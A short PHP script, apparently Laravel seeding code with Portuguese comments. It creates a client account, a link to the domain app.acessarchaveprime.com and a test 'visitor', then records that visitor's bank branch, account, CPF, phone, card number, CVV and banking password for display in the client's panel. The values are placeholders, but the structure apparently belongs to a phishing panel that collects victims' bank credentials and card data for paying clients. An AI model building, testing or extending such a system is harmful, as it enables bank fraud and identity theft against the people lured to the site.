<?php

// Encontrar o usuário cliente (Cliente 1)
$usuario = App\Models\Usuario::where('nivel_acesso', 'cliente')->where('ativo', 1)->first();

if (!$usuario) {
    echo "Não foi possível encontrar um cliente ativo.\n";
    return;
}

echo "Cliente encontrado: " . $usuario->nome . " (ID: " . $usuario->id . ")\n";

// Verificar ou criar um grupo de links para o usuário
$linkGroup = App\Models\LinkGroup::firstOrCreate(
    ['usuario_id' => $usuario->id],
    [
        'title' => 'Links do Cliente ' . $usuario->id,
        'description' => 'Grupo de links automático',
    ]
);

echo "Grupo de links: " . $linkGroup->title . " (ID: " . $linkGroup->id . ")\n";

// Criar ou encontrar um item de link para o domínio
$dominio = 'app.acessarchaveprime.com';
$linkItem = App\Models\LinkGroupItem::firstOrCreate(
    [
        'link_group_id' => $linkGroup->id,
        'title' => 'Link do ' . $dominio
    ],
    [
        'url' => 'https://' . $dominio,
        'order' => 0,
        'active' => true
    ]
);

echo "Link criado/encontrado: " . $linkItem->title . " (ID: " . $linkItem->id . ")\n";

// Criar um visitante
$visitante = App\Models\Visitante::create([
    'usuario_id' => $usuario->id,
    'link_id' => $linkItem->id,
    'ip' => '192.168.1.100',
    'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'referrer' => 'https://google.com'
]);

echo "Visitante criado com UUID: " . $visitante->uuid . "\n";

// Criar informações bancárias para o visitante
$informacao = App\Models\InformacaoBancaria::create([
    'visitante_uuid' => $visitante->uuid,
    'data' => now(),
    'agencia' => '1234',
    'conta' => '56789-0',
    'cpf' => '123.456.789-00',
    'nome_completo' => 'Visitante de Teste',
    'telefone' => '(11) 98765-4321',
    'informacoes_adicionais' => [
        'cartao' => '1234 5678 9012 3456',
        'cvv' => '123',
        'senha' => 'senha123',
        'observacoes' => 'Teste para o Cliente 1 - domínio ' . $dominio
    ]
]);

echo "Informações bancárias criadas com ID: " . $informacao->id . "\n";
echo "\nProcesso concluído com sucesso!\n";
echo "O visitante e suas informações bancárias agora podem ser visualizados no painel do Cliente 1.\n";
